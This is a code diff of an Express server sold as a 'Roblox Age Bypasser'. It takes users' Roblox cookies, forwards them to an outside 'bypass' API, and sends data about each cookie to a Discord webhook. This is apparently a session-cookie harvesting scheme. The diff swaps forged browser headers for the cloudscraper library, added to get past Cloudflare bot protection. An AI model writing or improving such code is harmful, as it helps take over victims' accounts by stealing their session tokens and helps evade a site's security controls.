@@ -1,59 +1,60 @@
 const express = require('express');
-const axios = require('axios');
+const axios = require('axios'); // We still use axios for our own webhook
+const cloudscraper = require('cloudscraper'); // The new library to bypass Cloudflare
 const { RobloxUser } = require('./getuserinfo');
 
 const app = express();
 app.use(express.json());
 
 const API_BASE_URL = 'https://rblxbypasser.com/api';
-const WEBSITE_URL = 'https://rblxbypasser.com/'; // The URL of their website
 
-// --- This is the key to making it work ---
-const FORGED_HEADERS = {
-    'Referer': WEBSITE_URL,
-    'Origin': WEBSITE_URL,
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
-};
-
-// --- Endpoint 1: Starts the bypass process (Now with forged headers) ---
+// --- Endpoint 1: Starts the bypass process (USING CLOUDSCRAPER) ---
 app.post('/api/bypass', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie) {
         return res.status(400).json({ success: false, message: "Cookie is required." });
     }
-    try {
-        // We forward the request, but with the forged headers to look legitimate
-        const response = await axios.post(`${API_BASE_URL}/bypass`, { cookie }, {
-            headers: FORGED_HEADERS
-        });
-        res.status(200).json(response.data);
-    } catch (error) {
-        const status = error.response?.status || 500;
-        const message = error.response?.data?.message || "Failed to initiate bypass. The external API may be down or blocking requests.";
-        res.status(status).json({ success: false, message });
-    }
+    
+    const options = {
+        method: 'POST',
+        url: `${API_BASE_URL}/bypass`,
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie })
+    };
+
+    cloudscraper(options).then(body => {
+        // Cloudscraper succeeded, send the response back to the user
+        res.status(200).json(JSON.parse(body));
+    }).catch(err => {
+        // Cloudscraper failed, this means a true error occurred
+        console.error("Cloudscraper bypass error:", err);
+        const status = err.statusCode || 500;
+        res.status(status).json({ success: false, message: "Bypass failed. The API may be down or has blocked our requests." });
+    });
 });
 
-// --- Endpoint 2: Polls for progress (Now with forged headers) ---
+// --- Endpoint 2: Polls for progress (USING CLOUDSCRAPER) ---
 app.get('/api/progress', async (req, res) => {
     const { token } = req.query;
     if (!token) {
         return res.status(400).json({ success: false, message: "Token is required." });
     }
-    try {
-        // We also forge headers here for consistency
-        const response = await axios.get(`${API_BASE_URL}/progress?token=${token}`, {
-            headers: FORGED_HEADERS
-        });
-        res.status(200).json(response.data);
-    } catch (error) {
-        const status = error.response?.status || 500;
-        const message = error.response?.data?.message || "Failed to get progress.";
-        res.status(status).json({ success: false, message });
-    }
+
+    const options = {
+        method: 'GET',
+        url: `${API_BASE_URL}/progress?token=${token}`
+    };
+    
+    cloudscraper(options).then(body => {
+        res.status(200).json(JSON.parse(body));
+    }).catch(err => {
+        console.error("Cloudscraper progress error:", err);
+        const status = err.statusCode || 500;
+        res.status(status).json({ success: false, message: "Failed to get progress." });
+    });
 });
 
-// --- Endpoint 3: Webhook Logic (No changes needed here) ---
+// --- Endpoint 3: Webhook Logic (No changes needed, this calls Discord directly) ---
 app.post('/api/webhook', async (req, res) => {
     const { cookie } = req.body;
     if (!cookie) {
@@ -77,7 +78,7 @@ app.post('/api/webhook', async (req, res) => {
             footer: { text: "Roblox Age Bypasser • Success" },
             timestamp: new Date().toISOString()
         };
-        await axios.post(webhookURL, { embeds: [embed] });
+        await axios.post(webhookURL, { embeds: [embed] }); // Using axios here is fine
         res.status(200).send("Webhook sent successfully.");
     } catch (error) {
         console.error("WEBHOOK TASK FAILED:", error.message);
